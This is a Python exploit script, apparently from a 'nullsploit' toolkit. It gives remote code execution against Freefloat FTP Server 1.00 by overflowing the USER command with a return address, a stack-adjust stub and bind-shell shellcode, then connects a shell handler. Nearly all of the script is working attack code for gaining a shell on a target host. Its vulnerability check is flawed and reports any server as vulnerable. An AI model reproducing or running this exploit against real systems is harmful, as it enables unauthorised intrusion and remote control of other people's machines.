#!/usr/bin/env python
"""
    nullsploit :: Remote Code Executon for Freefloat FTP Server

    AUTHOR :: TheXero
    WEBSITE :: www.nullsecurity.net

"""
import sys
if "." not in sys.path: 
    sys.path.append(".")

import struct
import shellcode
import exploitutils

BANNER                          = "FreeFloat Ftp Server (Version 1.00)" 
TARGETS                         = {
    0 : ['Windows wo/DEP ASLR', struct.pack("<I", 0x77c35459)],
    1 : ['Debug', struct.pack("<I",0x42424242)]
    }

def main():

    parser = exploitutils.arguments()
    args = parser.parse_args()

    if args.targets:
        print " Exploit targets avaiable:"
        print " ========================="
        for i in TARGETS:
            print " " + str(i) + " | " + TARGETS[i][0]
        sys.exit()

    if args.PORT:
        PORT = int(args.PORT)
    else:
        PORT = int(21)
    if args.PAYLOAD:
        PAYLOAD = str(args.PAYLOAD)
    else:
        PAYLOAD = 'win32bind'

    if args.RHOST:
        HOST = str(args.RHOST)
    else:
        parser.print_help()
        sys.exit()

    if args.check:
        checkVulnerability( HOST, PORT )
        sys.exit()

    if not args.TARGET:
        print " [!] Set a target before launching exploit"
        sys.exit()
    TARGET = TARGETS[int(args.TARGET)][1]
    
    run( HOST, PORT, TARGET, PAYLOAD )
   
def checkVulnerability(HOST, PORT):
    # Check banner for Freefloat 1.0
    response = exploitutils.bannerchecktest(HOST, PORT)
    
    for BANNER in response:
        print " Received %s" % response
        print " [+] Target appears vulnerable"
        return

    print " [-] Target is not vulnerable"
    sys.exit()

def makeSploit( TARGET, PAYLOAD ):
    """
    Construct the attack
    """
    OFFSET=230
    BADCHARS='\x00\x0a\x0d'
    stack = exploitutils.randomstring( OFFSET )
    stack+= TARGET
    stack+= exploitutils.randomstring( 8 )
    stack+= "\x81\xc4\x54\xf2\xff\xff"
    stack+= shellcode.generateshellcode( PAYLOAD, BADCHARS )
    stack+= exploitutils.randomstring( 1000 - len( stack ))
    SPLOITSTRING = "USER " + stack + "\r\n"
    return SPLOITSTRING

def run( HOST, PORT, TARGET, PAYLOAD ):
    
    SPLOITSTRING = makeSploit( TARGET, PAYLOAD )
    SUCCESS = exploitutils.tcpexploit( HOST, PORT, SPLOITSTRING )
    if SUCCESS != True:
        print " [-] Exploit failed!"
        sys.exit()
    print " [+] Retreiving our shell\n"
    exploitutils.handler( HOST, PAYLOAD )

main()
